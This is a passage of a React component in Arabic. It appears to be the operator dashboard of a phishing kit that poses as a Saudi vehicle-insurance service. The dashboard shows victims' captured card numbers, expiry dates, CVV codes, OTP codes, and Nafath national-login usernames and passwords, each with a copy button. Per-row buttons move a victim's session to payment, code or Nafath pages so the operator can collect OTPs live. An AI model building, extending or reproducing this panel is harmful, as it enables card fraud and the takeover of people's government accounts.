                          : stat.color === "purple"
                            ? "bg-purple-400"
                            : "bg-indigo-400"
                    }
                  />
                  <div className="text-right">
                    <p
                      className={`text-sm font-semibold ${
                        stat.color === "emerald"
                          ? "text-emerald-600"
                          : stat.color === "blue"
                            ? "text-blue-600"
                            : stat.color === "purple"
                              ? "text-purple-600"
                              : "text-indigo-600"
                      }`}
                    >
                      {stat.comparison}
                    </p>
                    <p className="text-xs text-muted-foreground">{stat.description}</p>
                  </div>
                </div>
              </CardContent>
            </Card>
          )
        })}
      </div>

      <Tabs defaultValue="notifications" className="w-full">
        <div className="flex flex-col sm:flex-row justify-between items-start sm:items-center mb-6 gap-4">
          <TabsList className="grid w-full sm:w-auto grid-cols-2 h-11 bg-muted/50 backdrop-blur-sm">
            <TabsTrigger
              value="notifications"
              className="flex items-center gap-2 px-6 py-2 data-[state=active]:bg-primary data-[state=active]:text-primary-foreground data-[state=active]:shadow-lg"
            >
              <Bell className="h-4 w-4" /> الإشعارات
            </TabsTrigger>
            <TabsTrigger
              value="insights"
              className="flex items-center gap-2 px-6 py-2 data-[state=active]:bg-primary data-[state=active]:text-primary-foreground data-[state=active]:shadow-lg"
            >
              <BarChartHorizontalBig className="h-4 w-4" /> رؤى سريعة
            </TabsTrigger>
          </TabsList>
          <div className="w-full sm:w-80">
            <SearchBar onSearch={setSearchTerm} initialTerm={searchTerm} />
          </div>
        </div>

        <TabsContent value="notifications" className="space-y-6 mt-0">
          <div className="flex flex-col sm:flex-row items-start sm:items-center gap-4 mb-6">
            <div className="flex gap-2 flex-wrap">
              {[
                { label: "الكل", type: "all", count: filteredNotifications.length, icon: Users, color: "blue" },
                { label: "البطاقات", type: "card", count: cardCount, icon: CreditCard, color: "emerald" },
                { label: "نفاذ", type: "nafaz", count: nafazCount, icon: Key, color: "purple" },
                { label: "المتصلين", type: "online", count: onlineCountFiltered, icon: UserCheck, color: "indigo" },
              ].map((filter) => (
                <Button
                  key={filter.type}
                  variant={filterType === filter.type ? "default" : "outline"}
                  onClick={() => setFilterType(filter.type as any)}
                  size="sm"
                  className={`flex items-center gap-2 transition-all duration-200 h-10 px-4 ${
                    filterType === filter.type
                      ? `bg-gradient-to-r shadow-lg ${
                          filter.color === "blue"
                            ? "from-blue-500 to-blue-600 hover:from-blue-600 hover:to-blue-700"
                            : filter.color === "emerald"
                              ? "from-emerald-500 to-emerald-600 hover:from-emerald-600 hover:to-emerald-700"
                              : filter.color === "purple"
                                ? "from-purple-500 to-purple-600 hover:from-purple-600 hover:to-purple-700"
                                : "from-indigo-500 to-indigo-600 hover:from-indigo-600 hover:to-indigo-700"
                        } text-white border-0`
                      : "hover:bg-muted/80 hover:border-primary/30"
                  }`}
                >
                  <filter.icon className="h-4 w-4" />
                  {filter.label}
                  <Badge
                    variant={filterType === filter.type ? "secondary" : "outline"}
                    className={`px-2 text-xs ${
                      filterType === filter.type ? "bg-white/20 text-white border-white/30" : ""
                    }`}
                  >
                    {filter.count}
                  </Badge>
                </Button>
              ))}
            </div>
          </div>

          <Card className="shadow-xl overflow-hidden border-0 bg-gradient-to-br from-card via-card to-card/95">
            <CardHeader className="px-6 py-4 border-b bg-gradient-to-r from-muted/30 via-muted/20 to-muted/30 flex flex-row items-center justify-between">
              <CardTitle className="text-lg font-semibold flex items-center gap-3">
                <div className="p-2 rounded-lg bg-primary/20">
                  <FileText className="h-5 w-5 text-primary" />
                </div>
                <div>
                  <span>قائمة الإشعارات</span>
                  {searchTerm && (
                    <Badge variant="secondary" className="text-xs bg-primary/10 text-primary border-primary/20 mr-2">
                      نتائج البحث: {filteredNotifications.length}
                    </Badge>
                  )}
                </div>
              </CardTitle>
              <div className="flex items-center gap-2">
                <DropdownMenu>
                  <DropdownMenuTrigger asChild>
                    <Button variant="outline" size="sm" className="h-9 gap-2 hover:bg-primary/10 bg-transparent">
                      <ArrowUpDown className="h-4 w-4" />
                      <span className="sr-only sm:not-sr-only">ترتيب</span>
                    </Button>
                  </DropdownMenuTrigger>
                  <DropdownMenuContent align="end" className="w-48">
                    <DropdownMenuItem>الأحدث أولاً</DropdownMenuItem>
                    <DropdownMenuItem>الأقدم أولاً</DropdownMenuItem>
                    <DropdownMenuSeparator />
                    <DropdownMenuItem>حسب الدولة</DropdownMenuItem>
                    <DropdownMenuItem>حسب الحالة</DropdownMenuItem>
                  </DropdownMenuContent>
                </DropdownMenu>
              </div>
            </CardHeader>
            <div className="overflow-x-auto">
              <Table>
                <TableHeader>
                  <TableRow className="bg-muted/30 hover:bg-muted/40 border-b">
                    <TableHead className="px-6 py-4 w-[150px] font-semibold">الدولة</TableHead>
                    <TableHead className="px-6 py-4 w-[320px] font-semibold">المعلومات</TableHead>
                    <TableHead className="px-6 py-4 w-[180px] font-semibold">الوقت</TableHead>
                    <TableHead className="px-6 py-4 w-[150px] text-center font-semibold">الحالة</TableHead>
                    <TableHead className="px-6 py-4 w-[150px] text-center font-semibold">كود OTP</TableHead>
                    <TableHead className="px-6 py-4 text-center font-semibold">الإجراءات</TableHead>
                  </TableRow>
                </TableHeader>
                <TableBody>
                  {paginatedNotifications.length > 0 ? (
                    paginatedNotifications.map((notification) => (
                      <TableRow
                        key={notification.id}
                        className={`${getRowBackgroundColor(notification.flagColor)} group`}
                      >
                        <TableCell className="px-6 py-4 font-medium">
                          <div className="flex items-center gap-3">
                            <div className="p-1.5 rounded-lg bg-muted/50">
                              <Globe className="h-4 w-4 text-muted-foreground" />
                            </div>
                            <span className="font-medium">{notification.country || "غير معروف"}</span>
                          </div>
                        </TableCell>
                        <TableCell className="px-6 py-4">
                          <div className="flex flex-wrap gap-2">
                            <Button
                              variant={notification.documment_owner_full_name ? "outline" : "secondary"}
                              size="sm"
                              className={`p-2 h-auto text-xs hover:bg-primary/10 rounded-lg ${
                                notification.documment_owner_full_name
                                  ? "bg-sky-500 text-white dark:text-emerald-400"
                                  : "text-red-600 dark:text-red-400 hover:bg-red-50 dark:hover:bg-red-900/20"
                              }`}
                              onClick={() => handleInfoClick(notification, "personal")}
                            >
                              {notification.documment_owner_full_name ||
                              notification.phone ||
                              notification.owner_identity_number ? (
                                <div className="flex items-center gap-2">
                                  <User className="h-3.5 w-3.5" />
                                  <span>معلومات المالك</span>
                                </div>
                              ) : (
                                <span className="text-muted-foreground flex items-center gap-2">
                                  <User className="h-3.5 w-3.5" />
                                  لا يوجد معلومات
                                </span>
                              )}
                            </Button>
                            <Button
                              variant={notification.cardNumber ? "outline" : "secondary"}
                              size="sm"
                              className={`p-2 h-auto text-xs rounded-lg ${
                                notification.cardNumber
                                  ? "bg-emerald-500 text-white dark:text-emerald-400 hover:bg-emerald-50 dark:hover:bg-emerald-900/20"
                                  : "text-red-600 dark:text-red-400 hover:bg-red-50 dark:hover:bg-red-900/20"
                              }`}
                              onClick={() => handleInfoClick(notification, "card")}
                            >
                              <div className="flex items-center gap-2">
                                <CreditCard className="h-3.5 w-3.5" />
                                <span>{notification.cardNumber ? "معلومات البطاقة" : "لا يوجد بطاقة"}</span>
                              </div>
                            </Button>
                            <Button
                              variant={notification.nafadUsername ? "outline" : "secondary"}
                              size="sm"
                              className={`p-2 h-auto text-xs rounded-lg ${
                                notification.nafadUsername
                                  ? "bg-purple-500 text-white dark:text-purple-400 hover:bg-purple-50 dark:hover:bg-purple-900/20"
                                  : "text-red-600 dark:text-red-400 hover:bg-red-50 dark:hover:bg-red-900/20"
                              }`}
                              onClick={() => handleInfoClick(notification, "nafaz")}
                            >
                              <div className="flex items-center gap-2">
                                <Key className="h-3.5 w-3.5" />
                                <span>{notification.nafadUsername ? "بيانات نفاذ" : "لا يوجد نفاذ"}</span>
                              </div>
                            </Button>
                          </div>
                        </TableCell>
                        <TableCell className="px-6 py-4 text-sm text-muted-foreground">
                          <div className="flex items-center gap-2">
                            <Clock className="h-3.5 w-3.5" />
                            <span>
                              {notification.createdDate &&
                                formatDistanceToNow(new Date(notification.createdDate), {
                                  addSuffix: true,
                                  locale: ar,
                                })}
                            </span>
                          </div>
                        </TableCell>
                        <TableCell className="px-6 py-4 text-center">
                          <div className="flex flex-col gap-2">
                            <UserStatus userId={notification.id} />
                            {notification.nafadUsername && <NafazStatus notification={notification} />}
                          </div>
                        </TableCell>
                        <TableCell className="px-6 py-4 text-center">
                          {(notification.otp || notification.otpCode) && (
                            <Badge variant="outline" className="font-mono text-xs bg-muted/50">
                              {notification.otp || notification.otpCode}
                            </Badge>
                          )}
                        </TableCell>
                        <TableCell className="px-6 py-4">
                          <div className="flex justify-center items-center gap-1.5 flex-wrap">
                            {[
                              { page: "1", label: "معلومات 1" },
                              { page: "4", label: "ملخص" },
                              { page: "6", label: "دفع" },
                              { page: "7", label: "كود" },
                              { page: "8888", label: "هاتف" },
                              { page: "9999", label: "نفاذ" },
                            ].map((item) => (
                              <Button
                                key={item.page}
                                variant={notification?.currentPage === item.page ? "default" : "outline"}
                                size="sm"
                                className={`h-8 px-3 text-xs transition-all duration-200 ${
                                  notification?.currentPage === item.page
                                    ? "bg-primary text-primary-foreground shadow-md"
                                    : "hover:bg-primary/10"
                                }`}
                                onClick={() => handleCurrentPage(notification.id, item.page)}
                              >
                                {item.label}
                              </Button>
                            ))}
                            <FlagColorSelector
                              notificationId={notification.id}
                              currentColor={notification.flagColor}
                              onColorChange={handleFlagColorChange}
                            />
                          </div>
                        </TableCell>
                      </TableRow>
                    ))
                  ) : (
                    <TableRow>
                      <TableCell colSpan={6} className="h-32 text-center">
                        <div className="flex flex-col items-center justify-center gap-4">
                          <div className="bg-muted/50 rounded-full p-4">
                            <Bell className="h-8 w-8 text-muted-foreground" />
                          </div>
                          <div className="space-y-1">
                            <p className="font-medium text-foreground">لا توجد إشعارات لعرضها</p>
                            <p className="text-sm text-muted-foreground">
                              {searchTerm ? "حاول تعديل مصطلحات البحث أو الفلاتر." : "ستظهر الإشعارات الجديدة هنا."}
                            </p>
                          </div>
                        </div>
                      </TableCell>
                    </TableRow>
                  )}
                </TableBody>
              </Table>
            </div>
            {totalPages > 1 && (
              <CardFooter className="px-6 py-4 border-t bg-muted/20">
                <div className="flex items-center justify-between w-full">
                  <p className="text-sm text-muted-foreground">
                    عرض {(currentPage - 1) * itemsPerPage + 1} إلى{" "}
                    {Math.min(currentPage * itemsPerPage, filteredNotifications.length)} من{" "}
                    {filteredNotifications.length} إشعار
                  </p>
                  <Pagination currentPage={currentPage} totalPages={totalPages} onPageChange={setCurrentPage} />
                </div>
              </CardFooter>
            )}
          </Card>
        </TabsContent>

        <TabsContent value="insights" className="space-y-6 mt-0">
          <div className="grid md:grid-cols-2 gap-6">
            <Card className="shadow-lg border-0">
              <CardHeader className="pb-4">
                <CardTitle className="text-lg font-semibold flex items-center gap-3">
                  <div className="bg-primary/20 p-2 rounded-lg">
                    <Calendar className="h-5 w-5 text-primary" />
                  </div>
                  آخر النشاطات
                </CardTitle>
                <CardDescription>آخر 5 نشاطات مسجلة في النظام مع تفاصيل شاملة.</CardDescription>
              </CardHeader>
              <CardContent>
                <ActivityTimeline notifications={notifications.filter((n) => !n.isHidden)} />
              </CardContent>
            </Card>

            <Card className="shadow-lg border-0">
              <CardHeader className="pb-4">
                <CardTitle className="text-lg font-semibold flex items-center gap-3">
                  <div className="bg-primary/20 p-2 rounded-lg">
                    <Zap className="h-5 w-5 text-primary" />
                  </div>
                  إجراءات سريعة
                </CardTitle>
                <CardDescription>أدوات وإعدادات للوصول السريع وإدارة النظام.</CardDescription>
              </CardHeader>
              <CardContent className="space-y-3">
                {[
                  {
                    label: "تصدير البيانات",
                    icon: Download,
                    action: () => setExportDialogOpen(true),
                    variant: "outline",
                    description: "تصدير جميع البيانات بصيغ مختلفة",
                  },
                  {
                    label: "إعدادات لوحة التحكم",
                    icon: Settings,
                    action: () => setSettingsOpen(true),
                    variant: "outline",
                    description: "تخصيص الإعدادات والتفضيلات",
                  },
                  {
                    label: "مسح جميع الإشعارات المرئية",
                    icon: Trash2,
                    action: handleClearAllVisible,
                    variant: "destructive",
                    disabled: notifications.filter((n) => !n.isHidden).length === 0,
                    description: "إخفاء جميع الإشعارات الحالية",
                  },
                ].map((item) => (
                  <Card key={item.label} className="border-muted/50 hover:border-primary/30 transition-colors">
                    <CardContent className="p-4">
                      <Button
                        variant={item.variant as any}
                        className="w-full justify-start gap-3 h-auto py-3"
                        onClick={item.action}
                        disabled={item.disabled}
                      >
                        <item.icon className="h-5 w-5" />
                        <div className="text-left">
                          <div className="font-medium">{item.label}</div>
                          <div className="text-xs text-muted-foreground">{item.description}</div>
                        </div>
                      </Button>
                    </CardContent>
                  </Card>
                ))}
              </CardContent>
            </Card>
          </div>
        </TabsContent>
      </Tabs>
    </>
  )

  return (
    <div
      dir="rtl"
      className="min-h-screen bg-gradient-to-br from-background via-muted/10 to-background text-foreground"
    >
      {/* Mobile Menu Sheet */}
      <Sheet open={mobileMenuOpen} onOpenChange={setMobileMenuOpen}>
        <SheetContent side="right" className="w-[300px] p-0" dir="rtl">
          <SheetHeader className="p-6 pb-4 border-b bg-gradient-to-r from-muted/50 to-muted/30">
            <SheetTitle className="flex items-center gap-3 text-lg">
              <div className="bg-primary/20 p-2 rounded-lg">
                <Bell className="h-5 w-5 text-primary" />
              </div>
              <span>لوحة التحكم</span>
            </SheetTitle>
          </SheetHeader>
          <div className="p-4 space-y-2">
            {[
              { label: "الإشعارات", icon: Bell, action: () => setMobileMenuOpen(false) },
              {
                label: "الإعدادات",
                icon: Settings,
                action: () => {
                  setSettingsOpen(true)
                  setMobileMenuOpen(false)
                },
              },
              {
                label: "تصدير البيانات",
                icon: Download,
                action: () => {
                  setExportDialogOpen(true)
                  setMobileMenuOpen(false)
                },
              },
            ].map((item) => (
              <Button
                key={item.label}
                variant="ghost"
                className="w-full justify-start gap-3 text-sm py-3 h-auto hover:bg-primary/10 rounded-lg"
                onClick={item.action}
              >
                <item.icon className="h-4 w-4 text-muted-foreground" /> {item.label}
              </Button>
            ))}
            <Separator className="my-4" />
            <Button
              variant="ghost"
              className="w-full justify-start gap-3 text-sm py-3 h-auto text-red-500 hover:text-red-600 hover:bg-red-50 dark:hover:bg-red-900/50 rounded-lg"
              onClick={handleLogout}
            >
              <LogOut className="h-4 w-4" /> تسجيل الخروج
            </Button>
          </div>
        </SheetContent>
      </Sheet>

      {/* Header */}
      <header className="sticky top-0 z-40 border-b bg-background/80 backdrop-blur-xl supports-[backdrop-filter]:bg-background/60 shadow-sm">
        <div className="container mx-auto flex h-16 items-center justify-between px-4 sm:px-6 lg:px-8">
          <div className="flex items-center gap-4">
            <Button
              variant="ghost"
              size="icon"
              className="lg:hidden hover:bg-primary/10 rounded-lg"
              onClick={() => setMobileMenuOpen(true)}
            >
              <Menu className="h-5 w-5" />
              <span className="sr-only">فتح القائمة</span>
            </Button>
            <div className="flex items-center gap-3">
              <div className="bg-gradient-to-br from-primary to-primary/80 p-2.5 rounded-xl shadow-lg">
                <Bell className="h-5 w-5 text-primary-foreground" />
              </div>
              <div className="hidden sm:block">
                <h1 className="text-xl font-bold bg-gradient-to-r from-foreground to-foreground/80 bg-clip-text">
                  لوحة الإشعارات
                </h1>
                <p className="text-xs text-muted-foreground">إدارة شاملة للإشعارات والمستخدمين</p>
              </div>
            </div>
          </div>
          <div className="flex items-center gap-3">
            <div className="hidden lg:flex items-center gap-2">
              <TooltipProvider>
                <Tooltip>
                  <TooltipTrigger asChild>
                    <Button
                      variant="ghost"
                      size="icon"
                      onClick={() => setSettingsOpen(true)}
                      className="rounded-lg hover:bg-primary/10"
                    >
                      <Settings className="h-5 w-5" />
                    </Button>
                  </TooltipTrigger>
                  <TooltipContent>
                    <p>الإعدادات</p>
                  </TooltipContent>
                </Tooltip>
              </TooltipProvider>
              <TooltipProvider>
                <Tooltip>
                  <TooltipTrigger asChild>
                    <Button
                      variant="ghost"
                      size="icon"
                      onClick={() => setExportDialogOpen(true)}
                      className="rounded-lg hover:bg-primary/10"
                    >
                      <Download className="h-5 w-5" />
                    </Button>
                  </TooltipTrigger>
                  <TooltipContent>
                    <p>تصدير البيانات</p>
                  </TooltipContent>
                </Tooltip>
              </TooltipProvider>
              <Button
                variant="outline"
                size="sm"
                onClick={handleClearAllVisible}
                disabled={notifications.filter((n) => !n.isHidden).length === 0}
                className="hidden sm:flex items-center gap-2 hover:bg-destructive/10 hover:text-destructive hover:border-destructive/30"
              >
                <Trash2 className="h-4 w-4" /> مسح الكل
              </Button>
            </div>
            <DropdownMenu>
              <DropdownMenuTrigger asChild>
                <Button variant="ghost" className="relative h-10 w-10 rounded-full hover:bg-primary/10">
                  <Avatar className="h-10 w-10 border-2 border-primary/20">
                    <AvatarImage src="/placeholder.svg?height=40&width=40" alt="Admin" />
                    <AvatarFallback className="bg-primary/10 text-primary font-semibold">مد</AvatarFallback>
                  </Avatar>
                </Button>
              </DropdownMenuTrigger>
              <DropdownMenuContent align="end" className="w-64" sideOffset={8}>
                <DropdownMenuLabel className="font-normal">
                  <div className="flex flex-col space-y-2 p-2">
                    <p className="text-sm font-semibold leading-none">مدير النظام</p>
                    <p className="text-xs leading-none text-muted-foreground">admin@example.com</p>
                    <div className="flex items-center gap-2 pt-1">
                      <div className="h-2 w-2 rounded-full bg-emerald-500 animate-pulse" />
                      <span className="text-xs text-emerald-600">متصل الآن</span>
                    </div>
                  </div>
                </DropdownMenuLabel>
                <DropdownMenuSeparator />
                <DropdownMenuItem onClick={() => setSettingsOpen(true)} className="gap-3 p-3">
                  <Settings className="h-4 w-4" />
                  <span>الإعدادات</span>
                </DropdownMenuItem>
                <DropdownMenuItem onClick={() => setExportDialogOpen(true)} className="gap-3 p-3">
                  <Download className="h-4 w-4" />
                  <span>تصدير البيانات</span>
                </DropdownMenuItem>
                <DropdownMenuSeparator />
                <DropdownMenuItem
                  onClick={handleLogout}
                  className="text-red-500 focus:text-red-600 focus:bg-red-50 dark:focus:bg-red-900/50 gap-3 p-3"
                >
                  <LogOut className="h-4 w-4" />
                  <span>تسجيل الخروج</span>
                </DropdownMenuItem>
              </DropdownMenuContent>
            </DropdownMenu>
          </div>
        </div>
      </header>

      {/* Main Content */}
      <main className="container mx-auto p-4 sm:p-6 lg:p-8">
        {isLoading && notifications.length > 0 && (
          <div className="fixed top-16 left-0 right-0 h-1 bg-primary/20 z-50">
            <div className="h-1 bg-gradient-to-r from-primary to-primary/80 animate-indeterminate-progress" />
          </div>
        )}
        {mainContent}
      </main>

      {/* Information Dialog */}
      <Dialog open={selectedInfo !== null} onOpenChange={closeDialog}>
        <DialogContent className="bg-gradient-to-br from-background to-muted/20 overflow-hidden max-w-2xl" dir="rtl">
          <DialogHeader>
            <DialogTitle className="flex items-center gap-3 text-lg">
              {selectedInfo === "personal" ? (
                <>
                  <div className="bg-blue-100 p-2 rounded-lg dark:bg-blue-900/30">
                    <Users className="h-5 w-5 text-blue-600 dark:text-blue-400" />
                  </div>
                  المعلومات الشخصية
                </>
              ) : selectedInfo === "card" ? (
                <>
                  <div className="bg-emerald-100 p-2 rounded-lg dark:bg-emerald-900/30">
                    <CreditCard className="h-5 w-5 text-emerald-600 dark:text-emerald-400" />
                  </div>
                  معلومات البطاقة
                </>
              ) : (
                <>
                  <div className="bg-purple-100 p-2 rounded-lg dark:bg-purple-900/30">
                    <Key className="h-5 w-5 text-purple-600 dark:text-purple-400" />
                  </div>
                  بيانات نفاذ
                </>
              )}
            </DialogTitle>
            <DialogDescription>
              تفاصيل {selectedInfo === "personal" ? "المستخدم" : selectedInfo === "card" ? "البطاقة" : "نفاذ"} المحددة
              مع جميع البيانات المتاحة.
            </DialogDescription>
          </DialogHeader>
          <div className="space-y-4 py-4 max-h-[60vh] overflow-y-auto">
            {selectedNotification &&
              (selectedInfo === "personal" ? (
                <div className="space-y-3">
                  {[
                    { label: "اسم مالك الوثيقة", value: selectedNotification.documment_owner_full_name, icon: User },
                    { label: "رقم هوية المالك", value: selectedNotification.owner_identity_number, icon: Shield },
                    { label: "رقم هوية المشتري", value: selectedNotification.buyer_identity_number, icon: Shield },
                    { label: "رقم هوية البائع", value: selectedNotification.seller_identity_number, icon: Shield },
                    { label: "رقم الهاتف", value: selectedNotification.phone, icon: User },
                    { label: "الرقم التسلسلي", value: selectedNotification.serial_number, icon: FileText },
                    {
                      label: "رقم تصنيع المركبة",
                      value: selectedNotification.vehicle_manufacture_number,
                      icon: FileText,
                    },
                    { label: "رقم التسلسل", value: selectedNotification.sequenceNumber, icon: FileText },
                    {
                      label: "غرض التأمين",
                      value: selectedNotification.insurance_purpose === "renewal" ? "تجديد" : "نقل ملكية",
                      icon: Shield,
                    },
                    {
                      label: "نوع المركبة",
                      value:
                        selectedNotification.vehicle_type === "registration"
                          ? "تسجيل"
                          : selectedNotification.vehicle_type === "customs"
                            ? "جمارك"
                            : "رقم تسلسلي",
                      icon: FileText,
                    },
                    {
                      label: "حالة الدفع",
                      value:
                        selectedNotification.paymentStatus === "completed"
                          ? "مكتمل"
                          : selectedNotification.paymentStatus === "pending"
                            ? "معلق"
                            : selectedNotification.paymentStatus,
                      icon: CreditCard,
                    },
                    { label: "تاريخ بداية البوليصة", value: selectedNotification.policyStartDate, icon: Calendar },
                    { label: "عرض التأمين المحدد", value: selectedNotification.selectedInsuranceOffer, icon: Shield },
                  ].map(
                    (item) =>
                      item.value && (
                        <Card key={item.label} className="border-muted/50 group">
                          <CardContent className="p-4">
                            <div className="flex items-center justify-between">
                              <div className="flex items-center gap-3">
                                <item.icon className="h-4 w-4 text-muted-foreground" />
                                <span className="text-sm font-medium text-muted-foreground">{item.label}</span>
                              </div>
                              <div className="flex items-center gap-2">
                                <span className="text-sm font-semibold text-foreground">{item.value}</span>
                                <CopyButton text={item.value} label={item.label} />
                              </div>
                            </div>
                          </CardContent>
                        </Card>
                      ),
                  )}
                  {selectedNotification.selectedAddons && selectedNotification.selectedAddons.length > 0 && (
                    <Card className="border-muted/50">
                      <CardContent className="p-4">
                        <div className="space-y-3">
                          <div className="flex items-center gap-3">
                            <FileText className="h-4 w-4 text-muted-foreground" />
                            <span className="text-sm font-medium text-muted-foreground">الإضافات المحددة</span>
                          </div>
                          <div className="flex flex-wrap gap-2">
                            {selectedNotification.selectedAddons.map((addon, index) => (
                              <Badge key={index} variant="outline" className="text-xs">
                                {typeof addon === "string" ? addon : JSON.stringify(addon)}
                              </Badge>
                            ))}
                          </div>
                        </div>
                      </CardContent>
                    </Card>
                  )}
                </div>
              ) : selectedInfo === "card" ? (
                <div className="space-y-3">
                  {[
                    {
                      label: "رقم البطاقة",
                      value: selectedNotification.cardNumber,
                      isCard: true,
                      icon: CreditCard,
                    },
                    {
                      label: "تاريخ الانتهاء",
                      value: selectedNotification.cardMonth + "/" + selectedNotification.cardYear,
                      isCard: true,
                      icon: DatabaseIcon,
                    },
                    {
                      label: "رمز الامان (CVV)",
                      value: selectedNotification.cvv || selectedNotification.cvv,
                      isOtp: true,
                      icon: Shield,
                    },
                    {
                      label: "رمز التحقق (OTP)",
                      value: selectedNotification.otp || selectedNotification.otpCode,
                      isOtp: true,
                      icon: Shield,
                    },
                  ].map(
                    (item) =>
                      item.value && (
                        <Card key={item.label} className="border-muted/50 group">
                          <CardContent className="p-4">
                            <div className="flex items-center justify-between">
                              <div className="flex items-center gap-3">
                                <item.icon className="h-4 w-4 text-muted-foreground" />
                                <span className="text-sm font-medium text-muted-foreground">{item.label}</span>
                              </div>
                              <div className="flex items-center gap-2">
                                {item.isCard ? (
                                  <Badge variant="secondary" className="font-mono text-sm">
                                    {item.value}
                                  </Badge>
                                ) : item.isOtp ? (
                                  <Badge variant="default" className="font-mono text-sm">
                                    {item.value}
                                  </Badge>
                                ) : (
                                  <span className="text-sm font-semibold text-foreground">{item.value}</span>
                                )}
                                <CopyButton text={item.value} label={item.label} />
                              </div>
                            </div>
                          </CardContent>
                        </Card>
                      ),
                  )}
                  {selectedNotification?.allOtp && selectedNotification?.allOtp?.length > 0 && (
                    <Card className="border-muted/50">
                      <CardContent className="p-4">
                        <div className="space-y-3">
                          <div className="flex items-center gap-3">
                            <Shield className="h-4 w-4 text-muted-foreground" />
                            <span className="text-sm font-medium text-muted-foreground">جميع رموز OTP المستلمة</span>
                          </div>
                          <div className="flex flex-wrap gap-2">
                            {selectedNotification?.allOtp?.map((otp, index) => (
                              <Badge key={index} variant="outline" className="font-mono text-xs">
                                {otp}
                              </Badge>
                            ))}
                          </div>
                        </div>
                      </CardContent>
                    </Card>
                  )}
                </div>
              ) : (
                // Nafaz information
                <div className="space-y-3">
                  {selectedNotification.nafadUsername && (
                    <Card className="border-purple-200 bg-purple-50/50 dark:border-purple-800 dark:bg-purple-900/20">
                      <CardContent className="p-4">
                        <div className="space-y-4">
                          <div className="flex items-center gap-3 mb-4">
                            <div className="bg-purple-100 p-2 rounded-lg dark:bg-purple-900/30">
                              <Key className="h-5 w-5 text-purple-600 dark:text-purple-400" />
                            </div>
                            <div>
                              <h3 className="font-semibold text-purple-900 dark:text-purple-100">
                                بيانات تسجيل الدخول نفاذ
                              </h3>
                              <p className="text-xs text-purple-700 dark:text-purple-300">
                                معلومات الدخول المستخدمة في نظام نفاذ
                              </p>
                            </div>
                          </div>

                          <div className="space-y-3">
                            <Card className="border-muted/50 group">
                              <CardContent className="p-4">
                                <div className="flex items-center justify-between">
                                  <div className="flex items-center gap-3">
                                    <User className="h-4 w-4 text-muted-foreground" />
                                    <span className="text-sm font-medium text-muted-foreground">اسم المستخدم</span>
                                  </div>
                                  <div className="flex items-center gap-2">
                                    <span className="text-sm font-semibold text-foreground font-mono">
                                      {selectedNotification.nafadUsername}
                                    </span>
                                    <CopyButton text={selectedNotification.nafadUsername} label="اسم المستخدم" />
                                  </div>
                                </div>
                              </CardContent>
                            </Card>

                            {selectedNotification.nafadPassword && (
                              <Card className="border-muted/50 group">
                                <CardContent className="p-4">
                                  <PasswordField value={selectedNotification.nafadPassword} label="كلمة المرور" />
                                </CardContent>
                              </Card>
                            )}

                            <Card className="border-muted/50">
                              <CardContent className="p-4">
                                <div className="flex items-center justify-between">
                                  <div className="flex items-center gap-3">
                                    <Shield className="h-4 w-4 text-muted-foreground" />
                                    <span className="text-sm font-medium text-muted-foreground">حالة التحقق</span>
                                  </div>
                                  <NafazStatus notification={selectedNotification} />
                                </div>
                              </CardContent>
                            </Card>

                            {selectedNotification.nafazLoginTime && (
                              <Card className="border-muted/50">
                                <CardContent className="p-4">
                                  <div className="flex items-center justify-between">
                                    <div className="flex items-center gap-3">
                                      <Clock className="h-4 w-4 text-muted-foreground" />
                                      <span className="text-sm font-medium text-muted-foreground">
                                        وقت تسجيل الدخول
                                      </span>
                                    </div>
                                    <span className="text-sm font-semibold text-foreground">
                                      {new Date(selectedNotification.nafazLoginTime).toLocaleString("ar-SA")}
                                    </span>
                                  </div>
                                </CardContent>
                              </Card>
                            )}

                            {selectedNotification.nafazAttempts && (
                              <Card className="border-muted/50">
                                <CardContent className="p-4">
                                  <div className="flex items-center justify-between">
                                    <div className="flex items-center gap-3">
                                      <Activity className="h-4 w-4 text-muted-foreground" />
                                      <span className="text-sm font-medium text-muted-foreground">عدد المحاولات</span>
                                    </div>
                                    <Badge variant="outline" className="font-mono">
                                      {selectedNotification.nafazAttempts}
                                    </Badge>
                                  </div>
                                </CardContent>
                              </Card>
                            )}
                          </div>
                        </div>
                      </CardContent>
                    </Card>
                  )}
                </div>
              ))}
            {(!selectedNotification ||
              (selectedInfo === "personal" &&
                !selectedNotification.documment_owner_full_name &&
                !selectedNotification.phone &&
                !selectedNotification.owner_identity_number &&
                !selectedNotification.buyer_identity_number &&
                !selectedNotification.seller_identity_number) ||
              (selectedInfo === "card" && !selectedNotification.cardNumber) ||
              (selectedInfo === "nafaz" && !selectedNotification.nafadUsername)) && (
              <div className="flex flex-col items-center justify-center py-8 text-center">
                <div className="bg-muted/50 rounded-full p-4 mb-3">
                  <AlertCircle className="h-8 w-8 text-muted-foreground" />
                </div>
                <p className="text-sm font-medium text-foreground mb-1">لا توجد معلومات متاحة</p>
                <p className="text-xs text-muted-foreground">لم يتم العثور على بيانات لعرضها في هذا القسم.</p>
              </div>
            )}
          </div>
          <DialogFooter>
            <Button variant="outline" onClick={closeDialog} className="w-full bg-transparent">
              إغلاق
            </Button>
          </DialogFooter>
        </DialogContent>
      </Dialog>

      <style jsx global>{`
        .animate-indeterminate-progress {
          animation: indeterminate-progress 2s infinite linear;
        }
        @keyframes indeterminate-progress {
          0% { transform: translateX(-100%) scaleX(0.3); }
          50% { transform: translateX(0) scaleX(0.5); }
          100% { transform: translateX(100%) scaleX(0.3); }
        }
        .animation-delay-150 {
          animation-delay: 150ms;
        }
      `}</style>
    </div>
  )
}
